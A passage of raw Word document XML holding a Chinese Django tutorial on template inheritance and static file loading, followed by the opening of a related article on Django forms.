          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板文件base.html的位置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC0830C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>extends标签支持相对路径，这就意味着当文件夹结构如下所示时:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743C3249" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>dir1/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012C8E07" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    template.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E605857" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    base2.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2C221B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    my/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D9EE12" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        base3.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40703A20" w14:textId="4E25311C" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>base1.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C72C481" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>模板template.html中以下继承方式都是可以的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349E6282" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "./base2.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEB15D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "../base1.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FE6D49" w14:textId="6DD22F30" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "./my/base3.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB34C34" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板文件加载静态文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AEABE4" w14:textId="7768F823" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>要在模板文件里加载静态文件如css文件和js文件，你一共有三步要走:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351E7BCA" w14:textId="36B839A2" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第一步: 先在你的app下新建一个static文件夹，然后把你需要静态文件放进去，推荐路径app/static/app/custom.css。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7FBF15" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第二步: 在myproject/settings.py增加静态文件设置静态文件STATIC_URL。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2064FEB7" w14:textId="5487C3A2" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATIC_URL = '/static/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8C81C1" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第三步：在你的模板里使用{% load static %}，如下所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705D3B11" w14:textId="11045233" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% load static %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4BE101" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052A924C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;html lang="en"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70573BD3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A13F35" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;title&gt;{% block title %} Django Web Applications {% endblock %} &lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C16437" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;link rel="stylesheet" href="{% static 'app/custom.css' %}"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725AA9B1" w14:textId="7A029956" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2CF0AD" w14:textId="262E6215" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2619DC9D" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你需要使用的静态文件不属于某个app，而属于整个项目project，那么你还可以定义静态文件文件夹列表。假设属于整个项目的静态文件放在/var/www/static/里，那么myproject/settings.py可以加入下面一行代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A6AC57" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATICFILES_DIRS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24520495" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    os.path.join(BASE_DIR, "static"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0F03A1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    '/var/www/static/',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EF3B1D" w14:textId="5721F9F9" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4D260D" w14:textId="65017A5A" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文里我们介绍Django模板的工作原理以及Django模板自带的标签和过滤器。我们还介绍了模板的继承以及如何在模板文件中使用静态文件。下次我们会介绍如何自定义模板的标签和过滤器。如果你喜欢我们的文章，欢迎关注我们的微信公众号【Python与Django大咖之路】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C07DA27" w14:textId="2306B3F5" w:rsidR="001C47AF" w:rsidRDefault="00995934" w:rsidP="00995934">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015</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId250" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础核心结束介绍(5): Forms表单的使用与设计</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7416CBB8" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础(5): 表单forms的设计与使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29923FFD" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId251" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-06-01</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AADA759" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F9E464" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BB88BF" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网络应用开发的5项基础核心技术包括</w:t>
      </w:r>
      <w:hyperlink r:id="rId252" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>模型（Model）的设计</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:hyperlink r:id="rId253" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>URL的设计与配置</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:hyperlink r:id="rId254" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>View（视图）的编写</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:hyperlink r:id="rId255" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Template（模板）的设计</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>和Form(表单)的使用。今天小编我就来拼个老命给你来介绍下第五项Django核心基础知识之表单forms的设计与使用吧, 并重点介绍下表单的验证。想持续了解后续Django Web开发技术请订阅我的公众号【Python与Django大咖之路】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2079FEF9" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03376C67" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是表单？何时使用表单？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00466C03" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在web开发里表单的使用必不可少。表单用于让用户提交数据或上传文件，表单也用于让用户编辑已有数据。Django的表单Forms类的作用是把用户输入的数据转化成Python对象格式，便于后续操作（比如存储，修改）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AA523C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2921998A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
